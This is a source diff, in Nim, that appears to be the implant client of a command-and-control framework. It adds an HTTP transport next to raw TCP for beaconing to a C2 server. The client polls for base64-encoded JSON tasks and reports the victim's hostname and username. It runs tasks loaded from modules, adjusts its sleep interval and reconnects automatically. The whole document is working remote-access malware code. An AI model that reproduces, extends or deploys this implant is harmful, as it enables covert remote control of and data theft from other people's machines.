@@ -1,14 +1,29 @@
-import net, base64, json, os, std/jsonutils, strutils
+import std/[base64, json, os, jsonutils, strutils]
+
+when defined(tcp):
+  import std/net
+elif defined(http):
+  import std/httpclient
 
 import modules, communication
 
-import ../clientTasks/index
-
-var client: Socket = newSocket()
+import ../clientTasks/index, types
 
 const port {.intdefine.}: int = 1234
 const autoConnectTime {.intdefine.}: int = 5000
 const ip {.strdefine.}: string = "127.0.0.1"
+
+when defined(tcp):
+  echo "tcp client"
+  let app: App = App()
+  app.socket = newSocket()
+elif defined(http):
+  echo "http client"
+  let app: App = App()
+  app.httpRoot = "http://" & ip & ":" & $port
+  app.httpClient = newHttpClient()
+else:
+  let app: App = App()
 
 var sleepTime = 5
 
@@ -19,8 +34,7 @@ elif defined(windows):
 else:
     const osType = "unknown"
 
-proc handleTask(client: Socket, jsonNode: JsonNode) =
-
+proc handleTask(app: App, jsonNode: JsonNode) =
 
   let taskId = jsonNode["taskId"].getInt()
   var params: seq[string] = @[]
@@ -28,7 +42,7 @@ proc handleTask(client: Socket, jsonNode: JsonNode) =
     params.add param.getStr()
   let taskName = jsonNode["task"].getStr()
   if taskName == "identify":
-    client.identify(
+    app.identify(
       taskId,
       hostname=hostname(),
       username=username(), 
@@ -42,43 +56,74 @@ proc handleTask(client: Socket, jsonNode: JsonNode) =
     )
   elif taskName == "sleep":
     sleepTime = parseInt(params[0])
-    client.sendOutput(newTaskOutput(taskId))
+    app.sendOutput(newTaskOutput(taskId))
   elif taskName == "enumtasks":
     let taskOutput = newTaskOutput(taskId)
     var taskNames: seq[tuple[name: string]] = @[(name: "enumtasks"), (name: "sleep")]
     for task in tasks: taskNames.add (name: task.name)
     taskOutput.addData(Object, "tasks", $(toJson taskNames))
-    client.sendOutput(taskOutput)
+    app.sendOutput(taskOutput)
   else:
     var foundTask = false
     for cTask in tasks:
       if cTask.name == taskName:
         foundTask = true
-        cTask.execute(client, taskId, params)
+        cTask.execute(app, taskId, params)
     if not foundTask:
-      client.unknownTask(taskId, jsonNode["task"].getStr())
+      app.unknownTask(taskId, jsonNode["task"].getStr())
 
-proc receiveCommands(client: Socket) =
-  client.connectToC2()
+proc receiveCommands(app: App) =
+  app.connectToC2()
   while true:
-    client.send("tasksplz\r\n")
-    let line = client.recvLine()
-    if line.len == 0:
-      client.close()
-      break
+    when defined(debug):
+      echo "fetching commands"
+    when defined(tcp):
+      app.socket.send("tasksplz\r\n")
+      let line = app.socket.recvLine()
+      if line.len == 0:
+        app.socket.close()
+        break
     
-    let decoded = decode(line)
-    let jsonNode = parseJson(decoded)
-    if jsonNode.kind == JArray:
-      for task in jsonNode:
-        handleTask client, task 
+      let decoded = decode(line)
+      let jsonNode = parseJson(decoded)
+      if jsonNode.kind == JArray:
+        for task in jsonNode:
+          handleTask app, task 
+    elif defined(http):
+      var httpResponse: string
+      var fail = false
+      try:
+        when defined(debug):
+          echo "fetching " & app.httpRoot & "/t?id=" & app.token
+        httpResponse = app.httpClient.getContent(app.httpRoot & "/t?id=" & app.token)
+      except OSError:
+        when defined(debug):
+          echo getCurrentExceptionMsg()
+        app.httpClient = newHttpClient()
+        fail = true
+      except HttpRequestError:
+        app.connectToC2()
+        fail = true
+      if not fail:
+        let tasks = parseJson(decode(httpResponse))
+        if tasks.kind == JArray:
+          for task in tasks:
+            handleTask app, task
     sleep sleepTime*1000
-while true:
-  try:
-    client.connect(ip, Port(port))
-    receiveCommands(client)
-  except OSError:
+
+
+when defined(tcp):
+  while true:
+    try:
+      app.socket.connect(ip, Port(port))
+      receiveCommands(app)
+    except OSError:
+      sleep(autoConnectTime)
+      continue
+    when defined(tcp):
+      app.socket = newSocket()
     sleep(autoConnectTime)
-    continue
-  client = newSocket()
-  sleep(autoConnectTime)
+elif defined(http):
+  when defined(debug):
+    echo "receiving commands"
+  receiveCommands(app)
